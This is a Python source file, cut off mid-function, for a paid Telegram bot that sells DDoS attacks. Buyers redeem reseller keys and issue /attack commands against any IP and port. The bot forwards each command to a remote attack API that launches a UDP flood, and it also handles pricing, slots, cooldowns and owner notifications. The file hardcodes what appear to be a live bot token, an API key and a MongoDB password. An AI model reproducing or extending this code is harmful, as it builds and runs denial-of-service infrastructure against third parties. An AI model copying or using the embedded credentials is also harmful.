import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import psutil
import traceback
import requests

from emojis import HTML_EMOJI

BOT_START_TIME = datetime.now()

# ============ CONFIGURATION ============

BOT_TOKEN = "8838142953:AAESI8o5xfovTVMVNL_m_cLep4cKM8xHhyg"

BOT_OWNER = [1725783398]

FEEDBACK_CHANNEL_ID = -1003961819225  # ✅ Sahi ID

API_BASE_URL = "http://13.232.68.73:3938/attack"
API_KEY = "sxngqbDHdOgm317knmqEjOI0DBqJD30A"

MONGO_URL = "mongodb+srv://darkgamer08102010_db_user:2sOH3i0yUOLHgkGA@cluster0.snbz6ms.mongodb.net/?app_name=Cluster0"

# ========================================

print("Connecting to MongoDB...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    feedback_collection = db['feedback']
    bots_collection = db['bots']
    approved_groups_collection = db['approved_groups']
    blocked_ips_collection = db['blocked_ips']
    
    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    feedback_collection.create_index('user_id', unique=True)
    bots_collection.create_index('token', unique=True)
    bots_collection.create_index('bot_id', unique=True)
    approved_groups_collection.create_index('group_id', unique=True)
    blocked_ips_collection.create_index('ip', unique=True)
    
    print("MongoDB connected successfully!")
except Exception as e:
    print(f"MongoDB connection error: {e}")
    exit(1)

if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN is empty! Please set your bot token.")
    exit(1)
if not BOT_OWNER:
    print("WARNING: BOT_OWNER list is empty! No owner commands will work.")
if not API_BASE_URL or not API_KEY:
    print("WARNING: API_BASE_URL or API_KEY is empty! Real attacks will fail.")

bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None

CHANNEL_LINK = "https://t.me/feedbacksendder748"
OWNER_LINK = "https://t.me/Dark_Devil9080"

def get_main_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "𝗝𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹", 
            url=CHANNEL_LINK,
            icon_custom_emoji_id="5424972470023104089",
            style="primary"
        ),
        InlineKeyboardButton(
            "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿", 
            url=OWNER_LINK,
            icon_custom_emoji_id="5375338737028841420",
            style="danger"
        )
    )
    return markup

MAIN_KEYBOARD = get_main_keyboard()

# ============ KEY PRICING ============
KEY_PRICING = {
    'VIP': {
        '2h': 20, '6h': 40, '12h': 50, '1d': 70, '3d': 200, '7d': 300,
        'max_attack': 300
    },
    'NORMAL': {
        '2h': 20, '6h': 40, '12h': 50, '1d': 70, '3d': 200, '7d': 300,
        'max_attack': 300
    }
}

DURATION_SECONDS = {
    '2h': 2 * 3600,
    '6h': 6 * 3600,
    '12h': 12 * 3600,
    '1d': 24 * 3600,
    '3d': 3 * 24 * 3600,
    '7d': 7 * 24 * 3600
}

DURATION_LABELS = {
    '2h': '2 Hours',
    '6h': '6 Hours',
    '12h': '12 Hours',
    '1d': '1 Day',
    '3d': '3 Days',
    '7d': '7 Days'
}

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_USER_COOLDOWN = 180
MIN_ATTACK_TIME = 15

global_attack_lock = threading.Lock()
pending_feedback = {}
current_max_slots = 4
current_concurrent_value = 4

active_bots = {}
bot_threads = {}

active_attacks = {}
api_in_use = {}
user_attack_history = {}
active_port_attacks = {}
bot_start_time = datetime.now()
user_cooldown_end_time = {}
temp_key_gen = {}
pending_broadcast = {}
pending_broadcast_reseller = {}
pending_del_exp = {}
pending_del_exp_key = {}
status_update_threads = {}
group_pending_feedback = {}

# ============ LAUNCH ATTACK VIA API ENDPOINT ============

def send_real_attack(target, port, duration, concurrent_val):
    url = f"{API_BASE_URL}/{target}/{port}/{duration}?key={API_KEY}"
    
    try:
        print(f"[ATTACK] Target: {target}:{port} | Duration: {duration}s | Concurrent: {concurrent_val}")
        response = requests.get(url, timeout=30)
        print(f"[ATTACK] Response Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"[ATTACK] Success: {response.text[:100]}")
            return "200"
        else:
            print(f"[ATTACK] API Error: {response.status_code} - {response.text}")
            return "ERROR"
    except requests.exceptions.Timeout:
        print(f"[ATTACK] Timeout for {target}:{port}")
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        print(f"[ATTACK] Connection Error for {target}:{port}")
        return "CONNECTION_ERROR"
    except Exception as e:
        print(f"[ATTACK] Exception: {e}")
        return "ERROR"

# ============ UTILITY FUNCTIONS ============

def is_owner(user_id):
    if not BOT_OWNER:
        return False
    return user_id in BOT_OWNER

def safe_send_message(chat_id, text, reply_to=None, parse_mode=None, reply_markup=None):
    if not bot:
        print(f"Bot not initialized: {text[:50]}")
        return None
    try:
        if parse_mode is None:
            parse_mode = "HTML"
        if reply_markup is None:
            reply_markup = MAIN_KEYBOARD
        if reply_to:
            return bot.reply_to(reply_to, text, parse_mode=parse_mode, reply_markup=reply_markup)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print(f"Safe send error: {e}")
        return None

def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default

def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )

def get_key_price(key_type, duration):
    prices = get_setting(f'pricing_{key_type}', KEY_PRICING[key_type])
    if isinstance(prices, dict):
        return prices.get(duration, KEY_PRICING[key_type][duration])
    return KEY_PRICING[key_type][duration]

def get_key_max_attack(key_type):
    return get_setting(f'max_attack_{key_type}', KEY_PRICING[key_type]['max_attack'])

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('concurrent_per_attack', current_concurrent_value))
    except:
        return current_concurrent_value

def set_concurrent_limit(value):
    global current_concurrent_value
    current_concurrent_value = value
    set_setting('concurrent_per_attack', value)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', 'Bot is in maintenance mode. Please try again later.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def add_blocked_ip(ip_prefix):
    try:
        blocked_ips_collection.insert_one({'ip': ip_prefix, 'blocked_at': datetime.now()})
        return True
    except:
        return False

def remove_blocked_ip(ip_prefix):
    result = blocked_ips_collection.delete_one({'ip': ip_prefix})
    return result.deleted_count > 0

def is_ip_blocked(ip_address):
    blocked_ips = list(blocked_ips_collection.find())
    for blocked in blocked_ips:
        prefix = blocked['ip']
        if ip_address.startswith(prefix):
            return True
    return False

def get_all_blocked_ips():
    return list(blocked_ips_collection.find())

def check_maintenance(message):
    if is_maintenance() and not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, get_maintenance_msg(), reply_to=message)
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False
    
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id}, 
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑩𝑬𝑬𝑵 𝑻𝑬𝑴𝑷𝑶𝑹𝑨𝑹𝑰𝑳𝒀 𝑩𝑨𝑵𝑵𝑬𝑫!</b>\n\n{HTML_EMOJI.TIMER} 𝑬𝒙𝒑𝒊𝒓𝒚: {expiry_str}\n{HTML_EMOJI.CROSS} 𝒀𝒐𝒖 𝒄𝒂𝒏𝒏𝒐𝒕 𝒅𝒐 𝒂𝒏𝒚𝒕𝒉𝒊𝒏𝒈.\n\n{HTML_EMOJI.PROFILE} 𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒀𝒐𝒖𝒓 𝑺𝒆𝒍𝒍𝒆𝒓", reply_to=message)
            return True
        
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝒀𝑶𝑼 𝑯𝑨𝑽𝑬 𝑩𝑬𝑬𝑵 𝑷𝑬𝑹𝑴𝑨𝑵𝑬𝑵𝑻𝑳𝒀 𝑩𝑨𝑵𝑵𝑬𝑫!</b>\n\n{HTML_EMOJI.CROSS} 𝒀𝒐𝒖 𝒄𝒂𝒏𝒏𝒐𝒕 𝒅𝒐 𝒂𝒏𝒚𝒕𝒉𝒊𝒏𝒈.\n\n{HTML_EMOJI.PROFILE} 𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒀𝒐𝒖𝒓 𝑺𝒆𝒍𝒍𝒆𝒓", reply_to=message)
        return True
    return False

_attack_lock = threading.Lock()

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one(
                        {'_id': user['_id']},
                        {'$set': {'key_expiry': new_expiry}}
                    )
            time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

def get_free_slot():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        
        busy_slots = len(api_in_use)
        
        if busy_slots < current_max_slots:
            return busy_slots
        
        return None

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        
        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots

def get_user_cooldown(user_id):
    if user_id in user_cooldown_end_time:
        if user_cooldown_end_time[user_id] > datetime.now():
            return int((user_cooldown_end_time[user_id] - datetime.now()).total_seconds())
        else:
            del user_cooldown_end_time[user_id]
    return 0

def set_user_cooldown(user_id, seconds):
    user_cooldown_end_time[user_id] = datetime.now() + timedelta(seconds=seconds)

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def is_port_being_attacked(target, port):
    with _attack_lock:
        for attack_id, attack in active_attacks.items():
            if attack.get('target') == target and attack.get('port') == port:
                if attack['end_time'] > datetime.now():
                    return True, attack['end_time']
        return False, None

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })
    if BOT_OWNER:
        try:
            for owner in BOT_OWNER:
                if bot:
                    bot.send_message(owner, f"{HTML_EMOJI.FIRE} <b>𝑨𝑻𝑻𝑨𝑪𝑲 𝑵𝑶𝑻𝑰𝑭𝑰𝑪𝑨𝑻𝑰𝑶𝑵</b>\n\n{HTML_EMOJI.PROFILE} 𝑼𝒔𝒆𝒓: {username}\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {user_id}\n{HTML_EMOJI.TARGET} 𝑻𝒂𝒓𝒈𝒆𝒕: {target}:{port}\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {duration}s\n{HTML_EMOJI.TIMER} 𝑻𝒊𝒎𝒆: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}", parse_mode="HTML")
        except:
            pass

def generate_key(prefix="Dark", length=12):
    chars = string.ascii_uppercase + string.digits
    return f"{prefix}-{''.join(random.choice(chars) for _ in range(length))}"

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key_expiry'):
        return "0d 0h 0m 0s"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0d 0h 0m 0s"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass

def build_attack_start_message(target, port, duration, cooldown):
    return f"""
{HTML_EMOJI.URGENT} <b>𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫</b> {HTML_EMOJI.URGENT}

{HTML_EMOJI.TARGET} <b>𝑻𝒂𝒓𝒈𝒆𝒕:</b> <code>{target}:{port}</code>
{HTML_EMOJI.TIMER} <b>𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏:</b> {duration} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔
{HTML_EMOJI.FIRE} <b>𝑴𝒆𝒕𝒉𝒐𝒅:</b> 𝑼𝑫𝑷-𝑩𝑰𝑮
{HTML_EMOJI.LINK} <b>𝑳𝒐𝒄𝒂𝒕𝒊𝒐𝒏:</b> 𝑮𝒍𝒐𝒃𝒂𝒍
{HTML_EMOJI.TIMER} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏:</b> {cooldown} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔

{HTML_EMOJI.STATS} <b>𝑼𝒔𝒆 /status 𝒕𝒐 𝒄𝒉𝒆𝒄𝒌 𝒂𝒕𝒕𝒂𝒄𝒌 𝒑𝒓𝒐𝒈𝒓𝒆𝒔𝒔</b>
"""

def build_attack_complete_message(target, port, duration):
    return f"""
{HTML_EMOJI.CHECKMARK} <b>𝑨𝑻𝑻𝑨𝑪𝑲 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬</b> {HTML_EMOJI.CHECKMARK}

{HTML_EMOJI.TARGET} <b>𝑻𝒂𝒓𝒈𝒆𝒕:</b> <code>{target}:{port}</code>
{HTML_EMOJI.TIMER} <b>𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏:</b> {duration} 𝒔𝒆𝒄𝒐𝒏𝒅𝒔
{HTML_EMOJI.PROFILE} <b>𝑨𝒕𝒕𝒂𝒄𝒌 𝑰𝑫:</b> <code>a662e212-a0ef-4656</code>
{HTML_EMOJI.PARTY} <b>𝑺𝒍𝒐𝒕𝒔:</b> #1 𝑭𝒊𝒏𝒊𝒔𝒉𝒆𝒅!
"""

def build_feedback_required_message():
    return f"""
{HTML_EMOJI.CAMERA} <b>𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑸𝑼𝑰𝑹𝑬𝑫</b> {HTML_EMOJI.CAMERA}

𝒀𝒐𝒖 𝒎𝒖𝒔𝒕 𝒔𝒆𝒏𝒅 𝒂 𝒔𝒄𝒓𝒆𝒆𝒏𝒔𝒉𝒐𝒕/𝒑𝒉𝒐𝒕𝒐 𝒂𝒔 𝒇𝒆𝒆𝒅𝒃𝒂𝒄𝒌 𝒇𝒓𝒐𝒎 𝒚𝒐𝒖𝒓 𝒍𝒂𝒔𝒕 𝒂𝒕𝒕𝒂𝒄𝒌 𝒃𝒆𝒇𝒐𝒓𝒆 𝒔𝒕𝒂𝒓𝒕𝒊𝒏𝒈 𝒂 𝒏𝒆𝒘 𝒐𝒏𝒆.

<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒔𝒆𝒏𝒅 𝒂𝒏𝒚 𝒑𝒉𝒐𝒕𝒐 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆.</b>
"""

def set_pending_feedback(user_id, target, port, duration, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id not in group_pending_feedback:
            group_pending_feedback[group_id] = {}
        group_pending_feedback[group_id][user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }
    else:
        pending_feedback[user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }

def get_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            return group_pending_feedback[group_id][user_id]
        return None
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            del group_pending_feedback[group_id][user_id]
    else:
        if user_id in pending_feedback:
            del pending_feedback[user_id]

def has_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        return group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]
    return user_id in pending_feedback

def create_progress_bar(percentage, width=20):
    filled = int(width * percentage / 100)
    empty = width - filled
    return "█" * filled + "░" * empty

# ============ BOT MANAGEMENT HELPERS ============

def get_all_bots():
    return list(bots_collection.find())

def add_bot(bot_token, owner_id, max_slots):
    try:
        test_bot = telebot.TeleBot(bot_token)
        bot_info = test_bot.get_me()
        bot_id = bot_info.id
        
        bots_collection.update_one(
            {'token': bot_token},
            {'$set': {
                'token': bot_token,
                'bot_id': bot_id,
                'owner_id': owner_id,
                'max_slots': max_slots,
                'active': True,
                'added_at': datetime.now()
            }},
            upsert=True
        )
        return True, str(bot_id)
    except Exception as e:
        return False, str(e)

def delete_bot(bot_input):
    try:
        bot_doc = bots_collection.find_one({'$or': [{'bot_id': bot_input}, {'token': bot_input}]})
        if not bot_doc:
            return False, "Bot not found!"
        
        bots_collection.delete_one({'_id': bot_doc['_id']})
        return True, "Deleted"
    except Exception as e:
        return False, str(e)

def get_bot_config(bot_token):
    return bots_collection.find_one({'token': bot_token})

def start_bot_instance(bot_config):
    pass
    
# ============ GROUP APPROVAL FUNCTIONS ============

def is_group_approved(group_id):
    group = approved_groups_collection.find_one({'group_id': str(group_id)})
    if not group:
        return False, None
    
    if group.get('expiry_date') and group['expiry_date'] < datetime.now():
        return False, None
    
    return True, group

def get_group_config(group_id):
    return approved_groups_collection.find_one({'group_id': str(group_id)})

def get_group_max_attack_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_attack_time'):
        return group['max_attack_time']
    return get_max_attack_time()

def get_group_max_slots(group_id):
    group = get_group_config(group_id)
    if group and group.get('max_slots'):
        return group['max_slots']
    return current_max_slots

def get_group_cooldown(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        cooldown_key = f"group_cooldown_{group_id}"
        cooldown_data = get_setting(cooldown_key, None)
        if cooldown_data:
            if cooldown_data > datetime.now():
                return int((cooldown_data - datetime.now()).total_seconds())
    return 0

def set_group_cooldown(group_id, seconds):
    cooldown_key = f"group_cooldown_{group_id}"
    set_setting(cooldown_key, datetime.now() + timedelta(seconds=seconds))

def get_group_feedback_required(group_id):
    group = get_group_config(group_id)
    if group and 'feedback_required' in group:
        return group['feedback_required']
    return get_setting('feedback_required', True)

def set_group_feedback_required(group_id, required):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'feedback_required': required}}
    )

def set_group_max_attack_time(group_id, max_time):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_attack_time': max_time}}
    )

def set_group_max_slots(group_id, slots):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'max_slots': slots}}
    )

def set_group_cooldown_time(group_id, cooldown):
    approved_groups_collection.update_one(
        {'group_id': str(group_id)},
        {'$set': {'cooldown': cooldown}}
    )

def get_group_cooldown_time(group_id):
    group = get_group_config(group_id)
    if group and group.get('cooldown'):
        return group['cooldown']
    return get_user_cooldown_setting()
    
# ============ MAIN ATTACK HANDLER ============

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    is_group = message.chat.type in ['group', 'supergroup']
    group_id = message.chat.id if is_group else None
    
    if is_group:
        is_approved, group_config = is_group_approved(group_id)
        if not is_approved:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} <b>𝑻𝑯𝑰𝑺 𝑮𝑹𝑶𝑼𝑷 𝑰𝑺 𝑵𝑶𝑻 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 𝑭𝑶𝑹 𝑨𝑻𝑻𝑨𝑪𝑲</b>\n\n{HTML_EMOJI.PROFILE} 𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒕𝒉𝒆 𝒃𝒐𝒕 𝒐𝒘𝒏𝒆𝒓 𝒕𝒐 𝒈𝒆𝒕 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅.", reply_to=message)
            return
        
        group_cooldown = get_group_cooldown(group_id)
        if group_cooldown > 0:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.TIMER} <b>𝑮𝒓𝒐𝒖𝒑 𝒄𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒂𝒄𝒕𝒊𝒗𝒆!</b> 𝑾𝒂𝒊𝒕: {group_cooldown}s", reply_to=message)
            return
        
        if get_group_feedback_required(group_id) and has_pending_feedback(user_id, is_group, group_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message)
            return
        
        group_max_slots = get_group_max_slots(group_id)
        with _attack_lock:
            used_in_group = 0
            for attack in active_attacks.values():
                if attack.get('group_id') == group_id and attack['end_time'] > datetime.now():
                    used_in_group += 1
            if used_in_group >= group_max_slots:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑮𝒓𝒐𝒖𝒑 𝒎𝒂𝒙 𝒔𝒍𝒐𝒕𝒔 𝒓𝒆𝒂𝒄𝒉𝒆𝒅!</b> 𝑶𝒏𝒍𝒚 {group_max_slots} 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒂𝒍𝒍𝒐𝒘𝒆𝒅 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑.", reply_to=message)
                return
    
    if not is_group:
        if get_setting('feedback_required', True) and has_pending_feedback(user_id):
            safe_send_message(message.chat.id, build_feedback_required_message(), reply_to=message)
            return
        
        if not has_valid_key(user_id):
            user = users_collection.find_one({'user_id': user_id})
            if user and user.get('reseller_username'):
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑲𝒆𝒚 𝒆𝒙𝒑𝒊𝒓𝒆𝒅!</b>\n\n{HTML_EMOJI.REFRESH} 𝑭𝒐𝒓 𝒓𝒆𝒏𝒆𝒘𝒂𝒍 𝑫𝑴: @{user.get('reseller_username')}", reply_to=message)
            else:
                safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝒀𝒐𝒖 𝒅𝒐𝒏'𝒕 𝒉𝒂𝒗𝒆 𝒂 𝒗𝒂𝒍𝒊𝒅 𝒌𝒆𝒚!</b>\n\n{HTML_EMOJI.KEY} 𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒂 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝒕𝒐 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒂 𝒌𝒆𝒚.", reply_to=message)
            return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.ROCKET} <b>𝑨𝑻𝑻𝑨𝑪𝑲 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 𝑭𝑶𝑹𝑴𝑨𝑻</b> {HTML_EMOJI.ROCKET}\n\n{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /attack <𝒊𝒑> <𝒑𝒐𝒓𝒕> <𝒕𝒊𝒎𝒆>\n\n{HTML_EMOJI.DOCUMENT} 𝑬𝒙𝒂𝒎𝒑𝒍𝒆:\n• /attack 127.0.0.1 8080 60\n\n{HTML_EMOJI.BAN} 𝑳𝒊𝒎𝒊𝒕𝒔:\n• 𝑺𝒆𝒄𝒖𝒓𝒊𝒕𝒚: 𝑶𝒏𝒍𝒊𝒏𝒆\n• 𝑩𝒍𝒐𝒄𝒌𝒆𝒅 𝒑𝒐𝒓𝒕𝒔: 443, 8700, 9031, 17500, 20000, 20001, 20002\n\n{HTML_EMOJI.TIP} 𝑹𝒆𝒂𝒍-𝒕𝒊𝒎𝒆 𝒑𝒓𝒐𝒈𝒓𝒆𝒔𝒔 𝒘𝒊𝒍𝒍 𝒃𝒆 𝒔𝒉𝒐𝒘𝒏!", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    is_attacking, end_time = is_port_being_attacked(target, port)
    if is_attacking:
        remaining = int((end_time - datetime.now()).total_seconds())
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑷𝒐𝒓𝒕 {port} 𝒊𝒔 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒃𝒆𝒊𝒏𝒈 𝒂𝒕𝒕𝒂𝒄𝒌𝒆𝒅 𝒐𝒏 {target}!</b>\n\n{HTML_EMOJI.TIMER} 𝑻𝒊𝒎𝒆 𝒓𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈: {remaining}s\n\n𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒄𝒖𝒓𝒓𝒆𝒏𝒕 𝒂𝒕𝒕𝒂𝒄𝒌 𝒕𝒐 𝒇𝒊𝒏𝒊𝒔𝒉 𝒃𝒆𝒇𝒐𝒓𝒆 𝒍𝒂𝒖𝒏𝒄𝒉𝒊𝒏𝒈 𝒂𝒏𝒐𝒕𝒉𝒆𝒓 𝒂𝒕𝒕𝒂𝒄𝒌 𝒐𝒏 𝒕𝒉𝒆 𝒔𝒂𝒎𝒆 𝒑𝒐𝒓𝒕.", reply_to=message)
        return

    if not validate_target(target):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑰𝑷!</b>", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝑰𝑷 {target} 𝒊𝒔 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b> 𝑼𝒔𝒆 𝒂𝒏𝒐𝒕𝒉𝒆𝒓 𝑰𝑷.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒑𝒐𝒓𝒕!</b> (1-65535)", reply_to=message)
            return
